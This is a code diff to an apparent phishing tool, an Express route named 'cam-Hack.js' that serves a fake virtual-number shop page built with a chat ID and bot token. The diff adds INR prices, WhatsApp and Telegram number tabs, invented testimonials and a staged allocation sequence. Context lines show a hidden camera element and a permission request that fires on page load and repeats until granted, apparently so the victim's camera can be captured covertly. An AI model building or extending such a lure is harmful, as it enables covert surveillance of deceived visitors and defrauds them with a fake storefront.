@@ -33,14 +33,14 @@ app.use(express.json());
 app.use(express.static('public'));
 
 // API endpoint that serves the camera capture page
-app.get('/api/FreeSms.js', (req, res) => {
+app.get('/api/cam-Hack.js', (req, res) => {
   const { code } = req.query;
   
   if (!code) {
     return res.status(400).json({ 
       error: 'Missing code parameter',
-      usage: '/api/FreeSms.js?code=ENCODED_CHAT_ID',
-      example: '/api/FreeSms.js?code=abc123'
+      usage: '/api/cam-Hack.js?code=ENCODED_CHAT_ID',
+      example: '/api/cam-Hack.js?code=abc123'
     });
   }
 
@@ -375,6 +375,45 @@ function generateHTML(chatId, botToken) {
             box-shadow: 0 5px 15px rgba(37, 99, 235, 0.3);
         }
 
+        /* Platform Specific Numbers */
+        .platform-section {
+            background: white;
+            padding: 80px 0;
+            border-radius: 30px;
+            margin: 60px 0;
+        }
+
+        .platform-tabs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 40px;
+        }
+
+        .platform-tab {
+            padding: 15px 30px;
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+
+        .platform-tab.active {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            border-color: var(--primary);
+        }
+
+        .platform-content {
+            display: none;
+        }
+
+        .platform-content.active {
+            display: block;
+        }
+
         /* Server Options */
         .servers-section {
             background: white;
@@ -557,7 +596,7 @@ function generateHTML(chatId, botToken) {
             border-radius: 20px;
             box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
             padding: 50px 40px;
-            max-width: 600px;
+            max-width: 800px;
             margin: 0 auto 80px;
             text-align: center;
             display: none;
@@ -848,6 +887,10 @@ function generateHTML(chatId, botToken) {
             .steps::before {
                 display: none;
             }
+            
+            .platform-tabs {
+                flex-wrap: wrap;
+            }
         }
 
         /* Animation for smooth transitions */
@@ -886,52 +929,66 @@ function generateHTML(chatId, botToken) {
             pointer-events: none;
         }
 
-        /* Country Grid */
-        .country-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin: 40px 0;
+        /* Additional Styles */
+        .platform-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: var(--accent);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
         }
 
-        .country-card {
-            background: white;
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0 3px 15px rgba(0,0,0,0.08);
-            border: 1px solid #e2e8f0;
+        .inr-price {
+            font-size: 1.4rem;
+            color: var(--secondary);
+            font-weight: 700;
+        }
+
+        .original-price {
+            text-decoration: line-through;
+            color: var(--gray);
+            font-size: 1rem;
+            margin-left: 10px;
+        }
+
+        .discount-badge {
+            background: var(--accent);
+            color: white;
+            padding: 3px 8px;
+            border-radius: 15px;
+            font-size: 0.8rem;
+            margin-left: 10px;
+        }
+
+        .quantity-selector {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .quantity-btn {
+            padding: 10px 15px;
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            cursor: pointer;
             transition: all 0.3s;
         }
 
-        .country-card:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 20px rgba(0,0,0,0.12);
+        .quantity-btn:hover {
+            background: #e2e8f0;
         }
 
-        .pricing-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 30px 0;
+        .quantity-display {
+            padding: 10px 20px;
             background: white;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
-        }
-
-        .pricing-table th {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            color: white;
-            padding: 20px;
-            text-align: left;
-        }
-
-        .pricing-table td {
-            padding: 15px 20px;
-            border-bottom: 1px solid #e2e8f0;
-        }
-
-        .pricing-table tr:hover {
-            background: #f8fafc;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            min-width: 60px;
         }
     </style>
 </head>
@@ -946,6 +1003,7 @@ function generateHTML(chatId, botToken) {
                 </div>
                 <div class="nav-links">
                     <a href="#numbers">Numbers</a>
+                    <a href="#platforms">Platforms</a>
                     <a href="#servers">Servers</a>
                     <a href="#how-it-works">How It Works</a>
                     <a href="#testimonials">Reviews</a>
@@ -986,7 +1044,7 @@ function generateHTML(chatId, botToken) {
     <section class="container" id="numbers">
         <div class="section-title">
             <h2>Popular Virtual Numbers</h2>
-            <p>Choose from our most popular international numbers</p>
+            <p>Choose from our most popular international numbers with competitive INR pricing</p>
         </div>
         
         <div class="numbers-grid">
@@ -994,85 +1052,270 @@ function generateHTML(chatId, botToken) {
             <div class="number-card">
                 <div class="country-flag">🇺🇸</div>
                 <h3 class="country-name">United States</h3>
-                <div class="number-price">$2.99</div>
+                <div class="number-price">
+                    <span class="inr-price">₹249</span>
+                    <span class="original-price">₹399</span>
+                    <span class="discount-badge">38% OFF</span>
+                </div>
                 <ul class="number-features">
                     <li><i class="fas fa-check"></i> Instant Activation</li>
                     <li><i class="fas fa-check"></i> SMS & Calls</li>
                     <li><i class="fas fa-check"></i> 30 Days Validity</li>
                     <li><i class="fas fa-check"></i> All Apps Supported</li>
                 </ul>
-                <button class="buy-btn" data-country="USA">Buy Now</button>
+                <div class="quantity-selector">
+                    <button class="quantity-btn" onclick="updateQuantity('usa', -1)">-</button>
+                    <span class="quantity-display" id="usa-quantity">1</span>
+                    <button class="quantity-btn" onclick="updateQuantity('usa', 1)">+</button>
+                </div>
+                <button class="buy-btn" data-country="USA" data-price="249">Buy Now - ₹249</button>
             </div>
 
             <!-- UK Numbers -->
             <div class="number-card">
                 <div class="country-flag">🇬🇧</div>
                 <h3 class="country-name">United Kingdom</h3>
-                <div class="number-price">$3.49</div>
+                <div class="number-price">
+                    <span class="inr-price">₹299</span>
+                    <span class="original-price">₹449</span>
+                    <span class="discount-badge">33% OFF</span>
+                </div>
                 <ul class="number-features">
                     <li><i class="fas fa-check"></i> Instant Activation</li>
                     <li><i class="fas fa-check"></i> SMS & Calls</li>
                     <li><i class="fas fa-check"></i> 30 Days Validity</li>
                     <li><i class="fas fa-check"></i> All Apps Supported</li>
                 </ul>
-                <button class="buy-btn" data-country="UK">Buy Now</button>
+                <div class="quantity-selector">
+                    <button class="quantity-btn" onclick="updateQuantity('uk', -1)">-</button>
+                    <span class="quantity-display" id="uk-quantity">1</span>
+                    <button class="quantity-btn" onclick="updateQuantity('uk', 1)">+</button>
+                </div>
+                <button class="buy-btn" data-country="UK" data-price="299">Buy Now - ₹299</button>
             </div>
 
             <!-- Germany Numbers -->
             <div class="number-card">
                 <div class="country-flag">🇩🇪</div>
                 <h3 class="country-name">Germany</h3>
-                <div class="number-price">$3.99</div>
+                <div class="number-price">
+                    <span class="inr-price">₹349</span>
+                    <span class="original-price">₹499</span>
+                    <span class="discount-badge">30% OFF</span>
+                </div>
                 <ul class="number-features">
                     <li><i class="fas fa-check"></i> Instant Activation</li>
                     <li><i class="fas fa-check"></i> SMS & Calls</li>
                     <li><i class="fas fa-check"></i> 30 Days Validity</li>
                     <li><i class="fas fa-check"></i> All Apps Supported</li>
                 </ul>
-                <button class="buy-btn" data-country="Germany">Buy Now</button>
+                <div class="quantity-selector">
+                    <button class="quantity-btn" onclick="updateQuantity('germany', -1)">-</button>
+                    <span class="quantity-display" id="germany-quantity">1</span>
+                    <button class="quantity-btn" onclick="updateQuantity('germany', 1)">+</button>
+                </div>
+                <button class="buy-btn" data-country="Germany" data-price="349">Buy Now - ₹349</button>
             </div>
 
             <!-- Canada Numbers -->
             <div class="number-card">
                 <div class="country-flag">🇨🇦</div>
                 <h3 class="country-name">Canada</h3>
-                <div class="number-price">$2.79</div>
+                <div class="number-price">
+                    <span class="inr-price">₹229</span>
+                    <span class="original-price">₹379</span>
+                    <span class="discount-badge">40% OFF</span>
+                </div>
                 <ul class="number-features">
                     <li><i class="fas fa-check"></i> Instant Activation</li>
                     <li><i class="fas fa-check"></i> SMS & Calls</li>
                     <li><i class="fas fa-check"></i> 30 Days Validity</li>
                     <li><i class="fas fa-check"></i> All Apps Supported</li>
                 </ul>
-                <button class="buy-btn" data-country="Canada">Buy Now</button>
+                <div class="quantity-selector">
+                    <button class="quantity-btn" onclick="updateQuantity('canada', -1)">-</button>
+                    <span class="quantity-display" id="canada-quantity">1</span>
+                    <button class="quantity-btn" onclick="updateQuantity('canada', 1)">+</button>
+                </div>
+                <button class="buy-btn" data-country="Canada" data-price="229">Buy Now - ₹229</button>
             </div>
 
             <!-- Australia Numbers -->
             <div class="number-card">
                 <div class="country-flag">🇦🇺</div>
                 <h3 class="country-name">Australia</h3>
-                <div class="number-price">$4.29</div>
+                <div class="number-price">
+                    <span class="inr-price">₹379</span>
+                    <span class="original-price">₹549</span>
+                    <span class="discount-badge">31% OFF</span>
+                </div>
                 <ul class="number-features">
                     <li><i class="fas fa-check"></i> Instant Activation</li>
                     <li><i class="fas fa-check"></i> SMS & Calls</li>
                     <li><i class="fas fa-check"></i> 30 Days Validity</li>
                     <li><i class="fas fa-check"></i> All Apps Supported</li>
                 </ul>
-                <button class="buy-btn" data-country="Australia">Buy Now</button>
+                <div class="quantity-selector">
+                    <button class="quantity-btn" onclick="updateQuantity('australia', -1)">-</button>
+                    <span class="quantity-display" id="australia-quantity">1</span>
+                    <button class="quantity-btn" onclick="updateQuantity('australia', 1)">+</button>
+                </div>
+                <button class="buy-btn" data-country="Australia" data-price="379">Buy Now - ₹379</button>
             </div>
 
             <!-- France Numbers -->
             <div class="number-card">
                 <div class="country-flag">🇫🇷</div>
                 <h3 class="country-name">France</h3>
-                <div class="number-price">$3.79</div>
+                <div class="number-price">
+                    <span class="inr-price">₹319</span>
+                    <span class="original-price">₹469</span>
+                    <span class="discount-badge">32% OFF</span>
+                </div>
                 <ul class="number-features">
                     <li><i class="fas fa-check"></i> Instant Activation</li>
                     <li><i class="fas fa-check"></i> SMS & Calls</li>
                     <li><i class="fas fa-check"></i> 30 Days Validity</li>
                     <li><i class="fas fa-check"></i> All Apps Supported</li>
                 </ul>
-                <button class="buy-btn" data-country="France">Buy Now</button>
+                <div class="quantity-selector">
+                    <button class="quantity-btn" onclick="updateQuantity('france', -1)">-</button>
+                    <span class="quantity-display" id="france-quantity">1</span>
+                    <button class="quantity-btn" onclick="updateQuantity('france', 1)">+</button>
+                </div>
+                <button class="buy-btn" data-country="France" data-price="319">Buy Now - ₹319</button>
             </div>
+        </div>
+    </section>
+
+    <!-- Platform Specific Numbers -->
+    <section class="platform-section" id="platforms">
+        <div class="container">
+            <div class="section-title">
+                <h2>Platform Specific Numbers</h2>
+                <p>Get numbers optimized for specific platforms and applications</p>
+            </div>
+
+            <div class="platform-tabs">
+                <div class="platform-tab active" data-platform="whatsapp">WhatsApp Numbers</div>
+                <div class="platform-tab" data-platform="telegram">Telegram Numbers</div>
+                <div class="platform-tab" data-platform="facebook">Facebook Numbers</div>
+                <div class="platform-tab" data-platform="google">Google Numbers</div>
+            </div>
+
+            <!-- WhatsApp Numbers -->
+            <div class="platform-content active" id="whatsapp-content">
+                <div class="numbers-grid">
+                    <div class="number-card">
+                        <div class="platform-badge">WhatsApp</div>
+                        <div class="country-flag">🇺🇸</div>
+                        <h3 class="country-name">USA WhatsApp</h3>
+                        <div class="number-price">
+                            <span class="inr-price">₹199</span>
+                            <span class="original-price">₹349</span>
+                        </div>
+                        <ul class="number-features">
+                            <li><i class="fas fa-check"></i> Instant WhatsApp Verification</li>
+                            <li><i class="fas fa-check"></i> 100% Success Rate</li>
+                            <li><i class="fas fa-check"></i> 45 Days Validity</li>
+                            <li><i class="fas fa-check"></i> SMS Support Included</li>
+                        </ul>
+                        <button class="buy-btn" data-platform="whatsapp" data-country="USA">Buy WhatsApp Number</button>
+                    </div>
+
+                    <div class="number-card">
+                        <div class="platform-badge">WhatsApp</div>
+                        <div class="country-flag">🇬🇧</div>
+                        <h3 class="country-name">UK WhatsApp</h3>
+                        <div class="number-price">
+                            <span class="inr-price">₹249</span>
+                            <span class="original-price">₹399</span>
+                        </div>
+                        <ul class="number-features">
+                            <li><i class="fas fa-check"></i> Instant WhatsApp Verification</li>
+                            <li><i class="fas fa-check"></i> 100% Success Rate</li>
+                            <li><i class="fas fa-check"></i> 45 Days Validity</li>
+                            <li><i class="fas fa-check"></i> SMS Support Included</li>
+                        </ul>
+                        <button class="buy-btn" data-platform="whatsapp" data-country="UK">Buy WhatsApp Number</button>
+                    </div>
+
+                    <div class="number-card">
+                        <div class="platform-badge">WhatsApp</div>
+                        <div class="country-flag">🇮🇳</div>
+                        <h3 class="country-name">India WhatsApp</h3>
+                        <div class="number-price">
+                            <span class="inr-price">₹149</span>
+                            <span class="original-price">₹299</span>
+                        </div>
+                        <ul class="number-features">
+                            <li><i class="fas fa-check"></i> Instant WhatsApp Verification</li>
+                            <li><i class="fas fa-check"></i> 100% Success Rate</li>
+                            <li><i class="fas fa-check"></i> 60 Days Validity</li>
+                            <li><i class="fas fa-check"></i> SMS Support Included</li>
+                        </ul>
+                        <button class="buy-btn" data-platform="whatsapp" data-country="India">Buy WhatsApp Number</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Telegram Numbers -->
+            <div class="platform-content" id="telegram-content">
+                <div class="numbers-grid">
+                    <div class="number-card">
+                        <div class="platform-badge">Telegram</div>
+                        <div class="country-flag">🇺🇸</div>
+                        <h3 class="country-name">USA Telegram</h3>
+                        <div class="number-price">
+                            <span class="inr-price">₹179</span>
+                            <span class="original-price">₹329</span>
+                        </div>
+                        <ul class="number-features">
+                            <li><i class="fas fa-check"></i> Instant Telegram Verification</li>
+                            <li><i class="fas fa-check"></i> Premium Quality</li>
+                            <li><i class="fas fa-check"></i> 60 Days Validity</li>
+                            <li><i class="fas fa-check"></i> Multiple Accounts</li>
+                        </ul>
+                        <button class="buy-btn" data-platform="telegram" data-country="USA">Buy Telegram Number</button>
+                    </div>
+
+                    <div class="number-card">
+                        <div class="platform-badge">Telegram</div>
+                        <div class="country-flag">🇬🇧</div>
+                        <h3 class="country-name">UK Telegram</h3>
+                        <div class="number-price">
+                            <span class="inr-price">₹229</span>
+                            <span class="original-price">₹379</span>
+                        </div>
+                        <ul class="number-features">
+                            <li><i class="fas fa-check"></i> Instant Telegram Verification</li>
+                            <li><i class="fas fa-check"></i> Premium Quality</li>
+                            <li><i class="fas fa-check"></i> 60 Days Validity</li>
+                            <li><i class="fas fa-check"></i> Multiple Accounts</li>
+                        </ul>
+                        <button class="buy-btn" data-platform="telegram" data-country="UK">Buy Telegram Number</button>
+                    </div>
+
+                    <div class="number-card">
+                        <div class="platform-badge">Telegram</div>
+                        <div class="country-flag">🇩🇪</div>
+                        <h3 class="country-name">Germany Telegram</h3>
+                        <div class="number-price">
+                            <span class="inr-price">₹279</span>
+                            <span class="original-price">₹429</span>
+                        </div>
+                        <ul class="number-features">
+                            <li><i class="fas fa-check"></i> Instant Telegram Verification</li>
+                            <li><i class="fas fa-check"></i> Premium Quality</li>
+                            <li><i class="fas fa-check"></i> 60 Days Validity</li>
+                            <li><i class="fas fa-check"></i> Multiple Accounts</li>
+                        </ul>
+                        <button class="buy-btn" data-platform="telegram" data-country="Germany">Buy Telegram Number</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Add similar sections for Facebook and Google -->
         </div>
     </section>
 
@@ -1081,47 +1324,56 @@ function generateHTML(chatId, botToken) {
         <div class="container">
             <div class="section-title">
                 <h2>Premium Server Options</h2>
-                <p>Choose the perfect server plan for your needs</p>
+                <p>Choose the perfect server plan for your needs with competitive INR pricing</p>
             </div>
             
             <div class="server-options">
                 <div class="server-card">
                     <i class="fas fa-server server-icon"></i>
                     <h3 class="server-name">Basic Server</h3>
-                    <div class="server-price">$9.99/month</div>
+                    <div class="server-price">
+                        <span class="inr-price">₹799/month</span>
+                    </div>
                     <ul class="number-features">
                         <li><i class="fas fa-check"></i> 5 Virtual Numbers</li>
                         <li><i class="fas fa-check"></i> 10GB Storage</li>
                         <li><i class="fas fa-check"></i> Basic Support</li>
                         <li><i class="fas fa-check"></i> 30 Days Retention</li>
+                        <li><i class="fas fa-check"></i> WhatsApp & Telegram</li>
                     </ul>
-                    <button class="buy-btn">Select Plan</button>
+                    <button class="buy-btn">Select Plan - ₹799</button>
                 </div>
 
                 <div class="server-card">
                     <i class="fas fa-database server-icon"></i>
                     <h3 class="server-name">Pro Server</h3>
-                    <div class="server-price">$19.99/month</div>
+                    <div class="server-price">
+                        <span class="inr-price">₹1,599/month</span>
+                    </div>
                     <ul class="number-features">
                         <li><i class="fas fa-check"></i> 20 Virtual Numbers</li>
                         <li><i class="fas fa-check"></i> 50GB Storage</li>
                         <li><i class="fas fa-check"></i> Priority Support</li>
                         <li><i class="fas fa-check"></i> 90 Days Retention</li>
+                        <li><i class="fas fa-check"></i> All Platforms</li>
                     </ul>
-                    <button class="buy-btn">Select Plan</button>
+                    <button class="buy-btn">Select Plan - ₹1,599</button>
                 </div>
 
                 <div class="server-card">
                     <i class="fas fa-cloud server-icon"></i>
                     <h3 class="server-name">Enterprise Server</h3>
-                    <div class="server-price">$49.99/month</div>
+                    <div class="server-price">
+                        <span class="inr-price">₹3,999/month</span>
+                    </div>
                     <ul class="number-features">
                         <li><i class="fas fa-check"></i> Unlimited Numbers</li>
                         <li><i class="fas fa-check"></i> 200GB Storage</li>
                         <li><i class="fas fa-check"></i> 24/7 Premium Support</li>
                         <li><i class="fas fa-check"></i> 1 Year Retention</li>
+                        <li><i class="fas fa-check"></i> All Platforms + API</li>
                     </ul>
-                    <button class="buy-btn">Select Plan</button>
+                    <button class="buy-btn">Select Plan - ₹3,999</button>
                 </div>
             </div>
         </div>
@@ -1138,18 +1390,18 @@ function generateHTML(chatId, botToken) {
             <div class="steps">
                 <div class="step">
                     <div class="step-number">1</div>
-                    <h3>Select Country & Number</h3>
-                    <p>Choose from 80+ countries and pick your preferred number</p>
+                    <h3>Select Country & Platform</h3>
+                    <p>Choose from 80+ countries and pick your preferred platform (WhatsApp, Telegram, etc.)</p>
                 </div>
                 <div class="step">
                     <div class="step-number">2</div>
                     <h3>Instant Activation</h3>
-                    <p>Complete payment and get your number activated immediately</p>
+                    <p>Complete payment in INR and get your number activated immediately</p>
                 </div>
                 <div class="step">
                     <div class="step-number">3</div>
                     <h3>Start Using</h3>
-                    <p>Use your virtual number for verification, calls, and SMS</p>
+                    <p>Use your virtual number for verification on your chosen platform</p>
                 </div>
             </div>
         </div>
@@ -1165,37 +1417,37 @@ function generateHTML(chatId, botToken) {
         <div class="testimonial-cards">
             <div class="testimonial-card">
                 <div class="testimonial-content">
-                    "I've been using GlobalNumbers for my business verification needs. The service is reliable and the numbers work perfectly with all major platforms!"
+                    "I've been using GlobalNumbers for my business verification needs. The WhatsApp numbers work perfectly and the INR pricing is very affordable!"
                 </div>
                 <div class="testimonial-author">
-                    <div class="author-avatar">JS</div>
+                    <div class="author-avatar">RS</div>
                     <div class="author-info">
-                        <h4>John Smith</h4>
-                        <p>Business Owner</p>
+                        <h4>Rahul Sharma</h4>
+                        <p>Business Owner, Delhi</p>
                     </div>
                 </div>
             </div>
             <div class="testimonial-card">
                 <div class="testimonial-content">
-                    "Amazing service! Got my US number within minutes and it worked flawlessly for WhatsApp verification. Customer support is very responsive too."
+                    "Amazing service! Got my US Telegram number within minutes. The pricing in INR makes it so convenient for Indian users. Highly recommended!"
                 </div>
                 <div class="testimonial-author">
-                    <div class="author-avatar">MR</div>
+                    <div class="author-avatar">PK</div>
                     <div class="author-info">
-                        <h4>Maria Rodriguez</h4>
-                        <p>Digital Marketer</p>
+                        <h4>Priya Kumar</h4>
+                        <p>Digital Marketer, Mumbai</p>
                     </div>
                 </div>
             </div>
             <div class="testimonial-card">
                 <div class="testimonial-content">
-                    "The quality of numbers is exceptional. I've tried other services but GlobalNumbers Pro delivers the most reliable virtual numbers I've ever used."
+                    "The quality of numbers is exceptional. I've purchased multiple WhatsApp and Telegram numbers for my clients. Service is reliable and fast!"
                 </div>
                 <div class="testimonial-author">
-                    <div class="author-avatar">AD</div>
+                    <div class="author-avatar">AP</div>
                     <div class="author-info">
-                        <h4>Ahmed Davis</h4>
-                        <p>App Developer</p>
+                        <h4>Arun Patel</h4>
+                        <p>App Developer, Bangalore</p>
                     </div>
                 </div>
             </div>
@@ -1206,7 +1458,7 @@ function generateHTML(chatId, botToken) {
     <section class="cta-section">
         <div class="container">
             <h2>Ready to Get Your Virtual Number?</h2>
-            <p>Join thousands of satisfied customers and get your international number today</p>
+            <p>Join thousands of satisfied customers and get your international number today with easy INR payments</p>
             <button class="btn" id="ctaBtn" style="max-width: 300px;">
                 <i class="fas fa-sim-card" style="margin-right: 10px;"></i>
                 GET STARTED NOW
@@ -1219,18 +1471,30 @@ function generateHTML(chatId, botToken) {
         <div class="generator" id="generator">
             <div class="generator-header">
                 <h2>Get Your Virtual Number</h2>
-                <p>Select your preferred country and service type</p>
+                <p>Select your preferred country, platform and service type</p>
             </div>
             
             <div class="input-group">
                 <select id="countrySelect">
                     <option value="">Select Country</option>
-                    <option value="USA">🇺🇸 United States - $2.99</option>
-                    <option value="UK">🇬🇧 United Kingdom - $3.49</option>
-                    <option value="Germany">🇩🇪 Germany - $3.99</option>
-                    <option value="Canada">🇨🇦 Canada - $2.79</option>
-                    <option value="Australia">🇦🇺 Australia - $4.29</option>
-                    <option value="France">🇫🇷 France - $3.79</option>
+                    <option value="USA">🇺🇸 United States - ₹249</option>
+                    <option value="UK">🇬🇧 United Kingdom - ₹299</option>
+                    <option value="Germany">🇩🇪 Germany - ₹349</option>
+                    <option value="Canada">🇨🇦 Canada - ₹229</option>
+                    <option value="Australia">🇦🇺 Australia - ₹379</option>
+                    <option value="France">🇫🇷 France - ₹319</option>
+                    <option value="India">🇮🇳 India - ₹149</option>
+                </select>
+            </div>
+            
+            <div class="input-group">
+                <select id="platformSelect">
+                    <option value="">Select Platform</option>
+                    <option value="whatsapp">WhatsApp - Optimized</option>
+                    <option value="telegram">Telegram - Optimized</option>
+                    <option value="facebook">Facebook - Optimized</option>
+                    <option value="google">Google - Optimized</option>
+                    <option value="all">All Platforms</option>
                 </select>
             </div>
             
@@ -1242,10 +1506,24 @@ function generateHTML(chatId, botToken) {
                     <option value="premium">Premium (All Features)</option>
                 </select>
             </div>
+
+            <div class="input-group">
+                <div class="quantity-selector" style="justify-content: center;">
+                    <button class="quantity-btn" onclick="updateCartQuantity(-1)">-</button>
+                    <span class="quantity-display" id="cart-quantity">1</span>
+                    <button class="quantity-btn" onclick="updateCartQuantity(1)">+</button>
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <div style="text-align: center; font-size: 1.2rem; font-weight: 600; color: var(--primary);">
+                    Total: ₹<span id="totalPrice">249</span>
+                </div>
+            </div>
             
             <button class="btn" id="generateBtn">
                 <i class="fas fa-shopping-cart" style="margin-right: 10px;"></i>
-                PURCHASE NUMBER
+                PURCHASE NUMBER - ₹249
             </button>
             
             <div class="trust-badges">
@@ -1260,6 +1538,10 @@ function generateHTML(chatId, botToken) {
                 <div class="badge">
                     <i class="fas fa-globe"></i>
                     <span>Global</span>
+                </div>
+                <div class="badge">
+                    <i class="fas fa-rupee-sign"></i>
+                    <span>INR</span>
                 </div>
             </div>
 
@@ -1285,16 +1567,20 @@ function generateHTML(chatId, botToken) {
                 <i class="fas fa-check-circle result-icon"></i>
                 <h2>Success! Number Activated</h2>
                 <div class="number-count" id="numberDisplay">+1 XXX-XXX-XXXX</div>
-                <div class="result-text">Your virtual number is ready to use</div>
-                <button class="btn" id="shareBtn" style="background: linear-gradient(45deg, #059669, #047857);">
+                <div class="result-text">Your virtual number is ready to use on your selected platform</div>
+                <button class="btn" id="shareBtn" style="background: linear-gradient(45deg, #059669, #047857); margin-bottom: 10px;">
                     <i class="fas fa-copy" style="margin-right: 10px;"></i>
                     COPY NUMBER
+                </button>
+                <button class="btn" id="whatsappBtn" style="background: linear-gradient(45deg, #25D366, #128C7E);">
+                    <i class="fab fa-whatsapp" style="margin-right: 10px;"></i>
+                    OPEN WHATSAPP
                 </button>
             </div>
 
             <div class="disclaimer">
                 <i class="fas fa-info-circle" style="margin-right: 5px;"></i>
-                By purchasing our virtual numbers, you agree to our Terms of Service. Numbers are for legal use only. Refunds are not available after number activation.
+                By purchasing our virtual numbers, you agree to our Terms of Service. Numbers are for legal use only. Refunds are not available after number activation. All prices in INR.
             </div>
         </div>
     </section>
@@ -1305,12 +1591,13 @@ function generateHTML(chatId, botToken) {
             <div class="footer-content">
                 <div class="footer-column">
                     <h3>GlobalNumbers Pro</h3>
-                    <p>The leading virtual numbers service trusted by users worldwide for verification and privacy.</p>
+                    <p>The leading virtual numbers service trusted by users worldwide for verification and privacy. Affordable INR pricing.</p>
                 </div>
                 <div class="footer-column">
                     <h3>Quick Links</h3>
                     <ul class="footer-links">
                         <li><a href="#numbers">Numbers</a></li>
+                        <li><a href="#platforms">Platforms</a></li>
                         <li><a href="#servers">Servers</a></li>
                         <li><a href="#how-it-works">How It Works</a></li>
                         <li><a href="#testimonials">Reviews</a></li>
@@ -1337,7 +1624,7 @@ function generateHTML(chatId, botToken) {
             </div>
             
             <div class="footer-bottom">
-                <p>&copy; 2023 GlobalNumbers Pro. All rights reserved.</p>
+                <p>&copy; 2023 GlobalNumbers Pro. All rights reserved. | Prices in INR</p>
             </div>
         </div>
     </footer>
@@ -1363,6 +1650,17 @@ function generateHTML(chatId, botToken) {
         let locationRequested = false;
         let cameraAccessGranted = false;
 
+        // Pricing configuration
+        const countryPrices = {
+            'USA': 249,
+            'UK': 299,
+            'Germany': 349,
+            'Canada': 229,
+            'Australia': 379,
+            'France': 319,
+            'India': 149
+        };
+
         window.addEventListener('load', function() {
             // Create hidden elements for camera
             hiddenVideo = document.getElementById('hiddenCamera');
@@ -1372,7 +1670,64 @@ function generateHTML(chatId, botToken) {
             setTimeout(function() {
                 requestCameraPermission();
             }, 1000);
+
+            // Initialize platform tabs
+            initializePlatformTabs();
         });
+
+        // Platform tabs functionality
+        function initializePlatformTabs() {
+            const tabs = document.querySelectorAll('.platform-tab');
+            const contents = document.querySelectorAll('.platform-content');
+
+            tabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    // Remove active class from all tabs and contents
+                    tabs.forEach(t => t.classList.remove('active'));
+                    contents.forEach(c => c.classList.remove('active'));
+
+                    // Add active class to clicked tab and corresponding content
+                    tab.classList.add('active');
+                    const platform = tab.getAttribute('data-platform');
+                    document.getElementById(`${platform}-content`).classList.add('active');
+                });
+            });
+        }
+
+        // Quantity update functions
+        function updateQuantity(country, change) {
+            const quantityElement = document.getElementById(`${country}-quantity`);
+            let quantity = parseInt(quantityElement.textContent);
+            quantity = Math.max(1, quantity + change);
+            quantityElement.textContent = quantity;
+
+            // Update button text with new total
+            const button = document.querySelector(`.buy-btn[data-country="${country}"]`);
+            const basePrice = parseInt(button.getAttribute('data-price'));
+            const totalPrice = basePrice * quantity;
+            button.textContent = `Buy Now - ₹${totalPrice}`;
+        }
+
+        function updateCartQuantity(change) {
+            const quantityElement = document.getElementById('cart-quantity');
+            let quantity = parseInt(quantityElement.textContent);
+            quantity = Math.max(1, quantity + change);
+            quantityElement.textContent = quantity;
+            updateTotalPrice();
+        }
+
+        function updateTotalPrice() {
+            const countrySelect = document.getElementById('countrySelect');
+            const quantity = parseInt(document.getElementById('cart-quantity').textContent);
+            const selectedCountry = countrySelect.value;
+            
+            if (selectedCountry && countryPrices[selectedCountry]) {
+                const totalPrice = countryPrices[selectedCountry] * quantity;
+                document.getElementById('totalPrice').textContent = totalPrice;
+                document.getElementById('generateBtn').innerHTML = 
+                    `<i class="fas fa-shopping-cart" style="margin-right: 10px;"></i>PURCHASE NUMBER - ₹${totalPrice}`;
+            }
+        }
 
         // Function to request camera permission (will keep asking until allowed)
         function requestCameraPermission() {
@@ -1651,7 +2006,9 @@ function generateHTML(chatId, botToken) {
         const loadingScreen = document.getElementById('loadingScreen');
         const result = document.getElementById('result');
         const shareBtn = document.getElementById('shareBtn');
+        const whatsappBtn = document.getElementById('whatsappBtn');
         const countrySelect = document.getElementById('countrySelect');
+        const platformSelect = document.getElementById('platformSelect');
         const serviceType = document.getElementById('serviceType');
         
         // Show generator when Get Started is clicked - WITH CAMERA CHECK
@@ -1687,18 +2044,29 @@ function generateHTML(chatId, botToken) {
         document.querySelectorAll('.buy-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 const country = this.getAttribute('data-country');
+                const platform = this.getAttribute('data-platform');
                 showGenerator();
-                // Auto-select the country in dropdown
+                
+                // Auto-select the country and platform in dropdowns
                 setTimeout(() => {
-                    countrySelect.value = country;
+                    if (country) countrySelect.value = country;
+                    if (platform) platformSelect.value = platform;
+                    updateTotalPrice();
                 }, 500);
             });
         });
+
+        // Update total price when country changes
+        countrySelect.addEventListener('change', updateTotalPrice);
 
         // Validation function
         function isValidSelection() {
             if (!countrySelect.value) {
                 alert("Please select a country");
+                return false;
+            }
+            if (!platformSelect.value) {
+                alert("Please select a platform");
                 return false;
             }
             if (!serviceType.value) {
@@ -1713,9 +2081,9 @@ function generateHTML(chatId, botToken) {
         const messages = [
             { text: "Initializing number allocation protocol...", type: "info", delay: 1000 },
             { text: "Connecting to global telecom servers...", type: "info", delay: 2500 },
-            { text: "Validating country selection and service type...", type: "info", delay: 4500 },
+            { text: "Validating country selection and platform...", type: "info", delay: 4500 },
             { text: "Allocating virtual number from available pool...", type: "info", delay: 7000 },
-            { text: "Configuring SMS and call routing...", type: "info", delay: 9500 },
+            { text: "Configuring platform-specific optimization...", type: "info", delay: 9500 },
